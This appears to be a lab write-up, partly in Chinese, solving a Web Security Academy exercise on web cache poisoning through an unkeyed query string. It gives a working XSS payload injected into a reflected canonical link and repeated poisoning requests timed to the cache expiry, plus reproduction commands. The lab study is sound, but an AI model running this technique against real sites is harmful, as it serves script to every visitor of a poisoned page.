---
title: "lab-web-cache-poisoning-unkeyed-query"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-unkeyed-query

> evidences: [[cache-poisoning-family]]

- 题面:Web cache poisoning via an unkeyed query string(/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)
- 实例:https://0ae200a703116266820e8da2001f008e.web-security-academy.net
- 判定目标:毒化首页,使 victim 执行 `alert(1)`;状态:**solved**(solved_check true)

## 关键步

1. 面同前一题:`<link rel="canonical" href='//<host>/?cb=MARK5'/>` 反射**整个 query**,单引号属性可破。
2. **整条 query string 不入缓存键** → 任意 `/?<payload>` 都映射到键 `/` ✓(比 unkeyed-param 更宽)。
3. 投毒:`raw_poison "<url>" --request-line "GET /?cb='/><script>alert(1)</script> HTTP/1.1" --interval-secs 6 --count 20`
   (多轮后台跑,覆盖 35s 的 max-age 过期窗口,直到 victim 命中)。
4. 收口:`solved_check`(victim 是"定期访问首页的 Chrome 用户")。

## 证据摘录

```
raw_poison "<inst>/" --request-line "GET /?cb='/><script>alert(1)</script> HTTP/1.1" --interval-secs 6 --count 20  (background)
lab_http get "<inst>/" -> canonical: //<host>/?cb='/><script>alert(1)</script>'
solved_check "<inst>/" --jar /tmp/b25-jar5.json -> {"solved":true}
```

## 复现命令

```
lab_launch launch C3CBE5ABAF85F50BFC76FB4C591A3811DCC7E393CBCE37D987780B4C79ECF1C4 --widget-source /web-security/web-cache-poisoning/exploiting-implementation-flaws --jar /tmp/b25-jar5.json
raw_poison "<inst>/" --request-line "GET /?cb='/><script>alert(1)</script> HTTP/1.1" --interval-secs 6 --count 20 --background
solved_check "<inst>/" --jar /tmp/b25-jar5.json
```
